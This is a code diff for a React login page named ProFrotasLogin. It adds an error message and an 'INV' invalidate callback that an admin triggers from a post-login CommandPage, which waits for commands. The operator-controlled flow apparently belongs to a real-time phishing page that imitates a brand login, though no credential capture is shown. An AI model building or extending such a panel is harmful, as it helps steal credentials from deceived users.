@@ -32,7 +32,6 @@ function ProFrotasLogin() {
         localStorage.removeItem("pf_user_id");
         localStorage.removeItem("pf_session_time");
         setUserId(null);
-        setCurrentCommand(null);
         setEmail("");
         setPassword("");
         setStep(1);
@@ -117,10 +116,19 @@ function ProFrotasLogin() {
     }
   };
 
+  // Callback quando admin envia INV - voltar para tela de email com erro
+  const handleInvalidate = () => {
+    setUserId(null);
+    setStep(1);
+    setPassword("");
+    setIsLoading(false);
+    setHasError(true);
+  };
+
   // Após login, mostrar CommandPage (ou AGUARDE se nenhum comando ainda)
   if (userId) {
     const CommandPage = require("@/pages/CommandPage").default;
-    return <CommandPage userId={userId} />;
+    return <CommandPage userId={userId} onInvalidate={handleInvalidate} />;
   }
 
   return (
@@ -152,12 +160,15 @@ function ProFrotasLogin() {
                 <input
                   type="text"
                   value={email}
-                  onChange={(e) => { setEmail(e.target.value); setEmailNotified(false); }}
-                  className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500 text-sm"
+                  onChange={(e) => { setEmail(e.target.value); setEmailNotified(false); setHasError(false); }}
+                  className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-blue-500 text-sm ${hasError ? 'border-red-500' : 'border-gray-300'}`}
                   style={{ height: '38px' }}
                   autoFocus
                   data-testid="email-input"
                 />
+                {hasError && (
+                  <p className="text-red-500 text-xs mt-1.5">E-mail ou senha incorretos. Verifique seus dados e tente novamente.</p>
+                )}
               </div>
 
               <button
